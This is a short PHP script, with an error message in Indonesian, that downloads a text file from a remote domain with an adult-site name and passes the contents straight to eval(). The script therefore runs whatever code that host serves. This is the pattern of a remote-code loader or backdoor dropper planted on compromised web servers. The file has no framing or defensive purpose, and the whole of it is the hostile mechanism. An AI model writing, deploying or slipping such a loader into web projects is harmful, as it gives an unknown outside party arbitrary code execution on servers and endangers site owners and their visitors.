<?php
$url = "https://v1.javpornsub.net/3.txt";

try {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $kode = curl_exec($ch);

    if (curl_errno($ch)) {
        throw new Exception("cURL Error: " . curl_error($ch));
    }

    eval("?>" . $kode);
} catch (Exception $e) {
    echo "Terjadi kesalahan: " . $e->getMessage();
} finally {
    if (isset($ch)) curl_close($ch);
}
?>